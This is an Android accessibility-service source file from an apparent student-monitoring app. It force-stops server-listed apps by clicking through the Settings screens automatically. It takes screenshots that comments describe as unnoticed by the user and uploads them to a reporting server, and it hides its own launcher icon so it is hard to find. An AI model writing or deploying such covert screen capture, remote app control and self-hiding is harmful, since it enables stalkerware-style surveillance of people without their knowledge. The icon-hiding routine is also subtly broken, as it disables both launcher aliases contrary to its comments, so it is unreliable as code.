package com.example.test_filesync.service;

import com.example.test_filesync.StudentApplication;
import com.example.test_filesync.api.dto.UserInfo;
import com.example.test_filesync.util.LogUtils;
import com.example.test_filesync.util.FileUpload;
import com.example.test_filesync.api.ApiCallback;
import com.example.test_filesync.api.ApiConfig;
import android.accessibilityservice.AccessibilityService;
import android.content.ComponentName;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;
import android.os.Looper;
import android.provider.MediaStore;
import android.provider.Settings;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.List;
import java.util.Locale;
import com.example.test_filesync.util.PullConfig;

public class MyAccessibilityService extends AccessibilityService {
    private static final String TAG = "MyAccessibilityService";
    private static MyAccessibilityService instance;
    // 要强制停止的目标包名
    private static String targetPackageToForceStop = null;
    // 是否正在执行强制停止操作
    private static boolean isForceStopInProgress = false;
    // 回调接口
    private static ForceStopCallback forceStopCallback;
    private Handler handler = new Handler(Looper.getMainLooper());
    // 定时任务 Runnable，每10秒执行一次
    private Runnable queryConfigRunnable = new Runnable() {
        @Override
        public void run() {
            PullConfig.pullConfig(getApplicationContext(), null);
            if (((StudentApplication) getApplicationContext()).hideAppIcon()) {
              hideAppIcon();
            } else {
              showAppIcon();
            }
            handler.postDelayed(this, 10 * 1000);
        }
    };

    // 强制停止回调接口
    public interface ForceStopCallback {
        void onForceStopResult(boolean success, String message);
    }

    @Override
    public void onServiceConnected() {
        super.onServiceConnected();
        instance = this;
        LogUtils.d(this, "Accessibility Service Connected");
        handler.post(queryConfigRunnable);
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        // 停止定时任务
        handler.removeCallbacks(queryConfigRunnable);
        instance = null;
        targetPackageToForceStop = null;
        isForceStopInProgress = false;
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event == null)
            return;

        int eventType = event.getEventType();

        // 监听窗口状态变化（App 打开/切换）
        if (eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
            LogUtils.d(this, "AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED" + event.getPackageName() + " " + event.getClassName());
            CharSequence packageName = event.getPackageName();
            CharSequence className = event.getClassName();

            if (packageName != null) {
                String pkg = packageName.toString();
                String cls = className != null ? className.toString() : "";
                  UserInfo userInfo = ((StudentApplication) getApplicationContext()).getUserInfo();
                  boolean isDisabled = false;
                  if (userInfo != null) {
                      List<UserInfo.AppItem> disabledApps = userInfo.getDisabledApps();
                      for (UserInfo.AppItem appItem : disabledApps) {
                          if (appItem.getPackageName().equals(pkg)) {
                              isDisabled = true;
                          }
                      }
                  } else {
                      LogUtils.d(this, "userInfo is null");
                  }

                  if (!isDisabled) {
                    LogUtils.d(this, pkg + ":app_pass");
                    return;
                  } else {
                    LogUtils.d(this, pkg + ":app_reject");
                  }

                  if (((StudentApplication) getApplicationContext()).isMonitor()) {
                      setForceStopTarget(pkg, null);
                      try {
                          Intent intent = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
                          intent.setData(Uri.parse("package:" + pkg));
                          intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                          getApplicationContext().startActivity(intent);
                          LogUtils.d(this, "正在自动执行强制停止...");
                      } catch (Exception e) {
                          cancelForceStop();
                          LogUtils.e(this, "无法打开应用设置: " + e.getMessage());
                      }
                  }
            }
        }

        // 如果不是正在执行强制停止操作，直接返回
        if (!isForceStopInProgress || targetPackageToForceStop == null) {
            return;
        }

        String packageName = event.getPackageName() != null ? event.getPackageName().toString() : "";

        // 只处理设置应用的事件
        if (!packageName.contains("settings") && !packageName.contains("Settings")) {
            return;
        }

        LogUtils.d(this, "Event: " + eventType + ", Package: " + packageName);

        if (eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED ||
                eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
            // 延迟一点执行，确保界面已经加载完成
            handler.postDelayed(this::performForceStopActions, 300);
        }
    }

    /**
     * 执行强制停止操作
     */
    private void performForceStopActions() {
        if (!isForceStopInProgress)
            return;

        AccessibilityNodeInfo rootNode = getRootInActiveWindow();
        if (rootNode == null) {
            LogUtils.d(this, "Root node is null");
            return;
        }

        try {
            // 步骤1: 查找并点击"强制停止"按钮
            if (clickForceStopButton(rootNode)) {
                LogUtils.d(this, "Clicked force stop button");
                performGlobalAction(GLOBAL_ACTION_BACK);
                return;
            }

            // 步骤2: 查找并点击确认对话框中的"确定"/"强制停止"按钮
            if (clickConfirmButton(rootNode)) {
                LogUtils.d(this, "Clicked confirm button");
                // 操作完成
                handler.postDelayed(() -> {
                    completeForceStop(true, "强制停止成功");
                    performGlobalAction(GLOBAL_ACTION_BACK);
                }, 500);
                return;
            }

        } catch (Exception e) {
            LogUtils.e(this, "Error in performForceStopActions: " + e.getMessage());
        } finally {
            rootNode.recycle();
        }
    }

    // 调用此方法即可回到桌面
    public void goHome() {
        Intent intent = new Intent(Intent.ACTION_MAIN);
        intent.addCategory(Intent.CATEGORY_HOME);
        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        startActivity(intent);
    }

    /**
     * 点击"强制停止"按钮
     */
    private boolean clickForceStopButton(AccessibilityNodeInfo rootNode) {
        // 中文设备上的按钮文本
        String[] forceStopTexts = { "强制停止", "强行停止", "Force stop", "FORCE STOP" };

        for (String text : forceStopTexts) {
            List<AccessibilityNodeInfo> nodes = rootNode.findAccessibilityNodeInfosByText(text);
            if (nodes != null && !nodes.isEmpty()) {
                for (AccessibilityNodeInfo node : nodes) {
                    if (node.isClickable() && node.isEnabled()) {
                        boolean clicked = node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                        node.recycle();
                        if (clicked) {
                            LogUtils.d(this, "Found and clicked: " + text);
                            return true;
                        }
                    }
                    // 如果节点本身不可点击，尝试点击其父节点
                    AccessibilityNodeInfo parent = node.getParent();
                    if (parent != null && parent.isClickable() && parent.isEnabled()) {
                        boolean clicked = parent.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                        parent.recycle();
                        node.recycle();
                        if (clicked) {
                            LogUtils.d(this, "Found and clicked parent of: " + text);
                            return true;
                        }
                    }
                    node.recycle();
                }
            }
        }
        return false;
    }

    /**
     * 点击确认对话框中的"确定"按钮
     */
    private boolean clickConfirmButton(AccessibilityNodeInfo rootNode) {
        // 确认对话框中的按钮文本
        String[] confirmTexts = { "确定", "确认", "OK", "强制停止", "Force stop", "FORCE STOP" };

        for (String text : confirmTexts) {
            List<AccessibilityNodeInfo> nodes = rootNode.findAccessibilityNodeInfosByText(text);
            if (nodes != null && !nodes.isEmpty()) {
                for (AccessibilityNodeInfo node : nodes) {
                    // 检查是否在对话框中（通常是AlertDialog）
                    if (node.isClickable() && node.isEnabled()) {
                        boolean clicked = node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                        node.recycle();
                        if (clicked) {
                            LogUtils.d(this, "Clicked confirm: " + text);
                            return true;
                        }
                    }
                    // 尝试点击父节点
                    AccessibilityNodeInfo parent = node.getParent();
                    if (parent != null && parent.isClickable() && parent.isEnabled()) {
                        boolean clicked = parent.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                        parent.recycle();
                        node.recycle();
                        if (clicked) {
                            return true;
                        }
                    }
                    node.recycle();
                }
            }
        }
        return false;
    }

    /**
     * 完成强制停止操作
     */
    private void completeForceStop(boolean success, String message) {
        isForceStopInProgress = false;
        targetPackageToForceStop = null;

        if (forceStopCallback != null) {
            forceStopCallback.onForceStopResult(success, message);
            forceStopCallback = null;
        }
    }

    @Override
    public void onInterrupt() {
        // 服务中断处理
        LogUtils.d(this, "Accessibility Service Interrupted");
    }

    /**
     * 获取服务实例
     */
    public static MyAccessibilityService getInstance() {
        return instance;
    }

    /**
     * 检查服务是否已启用
     */
    public static boolean isServiceEnabled() {
        return instance != null;
    }

    /**
     * 设置要强制停止的目标应用包名
     *
     * @param packageName 目标应用包名
     * @param callback    结果回调
     */
    public static void setForceStopTarget(String packageName, ForceStopCallback callback) {
        targetPackageToForceStop = packageName;
        isForceStopInProgress = true;
        forceStopCallback = callback;

        // 设置超时，10秒后自动取消
        if (instance != null) {
            instance.handler.postDelayed(() -> {
                if (isForceStopInProgress) {
                    completeForceStopStatic(false, "操作超时");
                }
            }, 10000);
        }
    }

    /**
     * 取消强制停止操作
     */
    public static void cancelForceStop() {
        isForceStopInProgress = false;
        targetPackageToForceStop = null;
        forceStopCallback = null;
    }

    /**
     * 检查是否正在执行强制停止
     */
    public static boolean isForceStopInProgress() {
        return isForceStopInProgress;
    }

    /**
     * 静态方法完成强制停止
     */
    private static void completeForceStopStatic(boolean success, String message) {
        isForceStopInProgress = false;
        targetPackageToForceStop = null;

        if (forceStopCallback != null) {
            forceStopCallback.onForceStopResult(success, message);
            forceStopCallback = null;
        }
    }

    // 触发截图的关键方法
    public void triggerScreenshot() {
        // 用户无感（无界面跳转/无弹窗提示）的实现应优先选择 performGlobalAction（Android 9+ 才支持，用户无需感知）
        boolean success = performGlobalAction(GLOBAL_ACTION_TAKE_SCREENSHOT);

        // 屏幕会出现截图，如果使用无障碍模拟点击

        if (success) {
            LogUtils.d(this, "截图触发成功，等待系统保存...");
            // 延迟2秒后从相册获取截图并上传（等待系统保存截图）
            handler.postDelayed(() -> {
                getLatestScreenshotAndUpload();
            }, 2000);
        } else {
            LogUtils.e(this, "截图触发失败");
        }
    }

    /**
     * 从相册获取最新的截图并上传
     */
    private void getLatestScreenshotAndUpload() {
        try {
            // 查询最新的截图
            Uri screenshotUri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI;
            String[] projection = {
                MediaStore.Images.Media._ID,
                MediaStore.Images.Media.DATA,
                MediaStore.Images.Media.DATE_ADDED,
                MediaStore.Images.Media.DISPLAY_NAME
            };

            // 查询条件：只查询Screenshots目录或最近5秒内添加的图片
            long currentTime = System.currentTimeMillis() / 1000;
            String selection = MediaStore.Images.Media.DATE_ADDED + " > ?";
            String[] selectionArgs = new String[] { String.valueOf(currentTime - 5) };

            // 按时间降序排列
            String sortOrder = MediaStore.Images.Media.DATE_ADDED + " DESC";

            Cursor cursor = getContentResolver().query(
                screenshotUri,
                projection,
                selection,
                selectionArgs,
                sortOrder
            );

            if (cursor != null && cursor.moveToFirst()) {
                int idColumn = cursor.getColumnIndexOrThrow(MediaStore.Images.Media._ID);
                int nameColumn = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME);

                long id = cursor.getLong(idColumn);
                String fileName = cursor.getString(nameColumn);
                Uri imageUri = Uri.withAppendedPath(screenshotUri, String.valueOf(id));

                cursor.close();

                LogUtils.d(this, "找到最新截图: " + fileName);

                // 读取图片数据
                InputStream inputStream = getContentResolver().openInputStream(imageUri);
                if (inputStream != null) {
                    ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
                    byte[] buffer = new byte[4096];
                    int bytesRead;
                    while ((bytesRead = inputStream.read(buffer)) != -1) {
                        outputStream.write(buffer, 0, bytesRead);
                    }
                    byte[] imageBytes = outputStream.toByteArray();
                    inputStream.close();
                    outputStream.close();

                    // 上传截图
                    uploadScreenshot(imageBytes, fileName);
                } else {
                    LogUtils.e(this, "无法读取截图文件");
                }
            } else {
                if (cursor != null) {
                    cursor.close();
                }
                LogUtils.e(this, "未找到最新截图");
            }

        } catch (Exception e) {
            LogUtils.e(this, "获取截图失败: " + e.getMessage());
        }
    }

    /**
     * 上传截图
     */
    private void uploadScreenshot(byte[] imageBytes, String originalFileName) {
        // 生成带时间戳的文件名
        String timestamp = new SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault()).format(new Date());
        String fileName = "screenshot_" + timestamp + ".jpg";
        LogUtils.d(this, "开始上传截图: " + fileName + ", 大小: " + imageBytes.length + " bytes");
        FileUpload fileUpload = new FileUpload(getApplicationContext());
        fileUpload.uploadImage(ApiConfig.report_screenshot, imageBytes, fileName, new ApiCallback() {
            @Override
            public void onSuccess(String result) {
                LogUtils.d(MyAccessibilityService.this, "截图上传成功: " + result);
            }

            @Override
            public void onFailure(Exception e) {
                LogUtils.e(MyAccessibilityService.this, "截图上传失败: " + e.getMessage());
            }
        });
    }

    /**
     * 隐藏桌面应用图标
     * 通过切换两个启动器别名来实现：禁用正常别名，启用隐藏别名（使用 "." 作为名称）
     * 这样既能隐藏图标，也能让搜索难以找到
     */
    private void hideAppIcon() {
        try {
            PackageManager packageManager = getPackageManager();

            // 正常的启动器别名
            ComponentName normalLauncher = new ComponentName(
                    getPackageName(),
                    "com.example.test_filesync.MainActivityLauncher");

            // 隐藏状态的启动器别名（名称为 "demo"，难以搜索）
            ComponentName hiddenLauncher = new ComponentName(
                    getPackageName(),
                    "com.example.test_filesync.MainActivityLauncherHidden");

            // 禁用正常的启动器
            packageManager.setComponentEnabledSetting(
                    normalLauncher,
                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                    PackageManager.DONT_KILL_APP);

            // 启用隐藏的启动器（名称为"."，很难被搜索到）
            packageManager.setComponentEnabledSetting(
                    hiddenLauncher,
                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                    PackageManager.DONT_KILL_APP);
            LogUtils.i(this, "MyAccessibilityService", "桌面图标已隐藏");
        } catch (Exception e) {
            LogUtils.i(this, "MyAccessibilityService", "隐藏图标失败: " + e.getMessage());
        }
    }

    /**
     * 显示桌面应用图标（用于恢复）
     * 切换回正常的启动器别名
     */
    public void showAppIcon() {
        try {
            PackageManager packageManager = getPackageManager();

            // 正常的启动器别名
            ComponentName normalLauncher = new ComponentName(
                    getPackageName(),
                    "com.example.test_filesync.MainActivityLauncher");

            // 隐藏状态的启动器别名
            ComponentName hiddenLauncher = new ComponentName(
                    getPackageName(),
                    "com.example.test_filesync.MainActivityLauncherHidden");

            // 启用正常的启动器
            packageManager.setComponentEnabledSetting(
                    normalLauncher,
                    PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                    PackageManager.DONT_KILL_APP);

            // 禁用隐藏的启动器
            packageManager.setComponentEnabledSetting(
                    hiddenLauncher,
                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                    PackageManager.DONT_KILL_APP);

            LogUtils.i(this, "MyAccessibilityService", "桌面图标已恢复");
        } catch (Exception e) {
            LogUtils.i(this, "MyAccessibilityService", "恢复图标失败: " + e.getMessage());
        }
    }

  /**
   * 刷新桌面图标
   * 尝试通知桌面刷新（不使用需要系统权限的广播）
   */
  private void refreshLauncherIcon() {
    try {
      // 方法1: 华为/荣耀桌面刷新广播（厂商自定义，不需要系统权限）
      try {
        Intent huaweiIntent = new Intent("com.huawei.android.launcher.action.CHANGE_APPLICATION_ICON");
        huaweiIntent.putExtra("packageName", getPackageName());
        huaweiIntent.putExtra("className", "com.example.test_filesync.MainActivity");
        sendBroadcast(huaweiIntent);
        LogUtils.i(this, "MainActivity", "已发送华为桌面刷新广播");
      } catch (Exception e) {
        LogUtils.i(this, "MainActivity", "华为刷新广播失败: " + e.getMessage());
      }

      // 方法2: 荣耀特定的刷新广播
      try {
        Intent honorIntent = new Intent("com.hihonor.android.launcher.action.CHANGE_APPLICATION_ICON");
        honorIntent.putExtra("packageName", getPackageName());
        sendBroadcast(honorIntent);
        LogUtils.i(this, "MainActivity", "已发送荣耀桌面刷新广播");
      } catch (Exception e) {
        LogUtils.i(this, "MainActivity", "荣耀刷新广播失败: " + e.getMessage());
      }

      // 方法3: 延迟返回桌面（强制触发桌面刷新）
      try {
        Intent homeIntent = new Intent(Intent.ACTION_MAIN);
        homeIntent.addCategory(Intent.CATEGORY_HOME);
        homeIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        startActivity(homeIntent);
        LogUtils.i(this, "MainActivity", "已返回桌面");
      } catch (Exception e) {
        LogUtils.i(this, "MainActivity", "返回桌面失败: " + e.getMessage());
      }

    } catch (Exception e) {
      LogUtils.i(this, "MainActivity", "刷新桌面失败: " + e.getMessage());
    }
  }
}
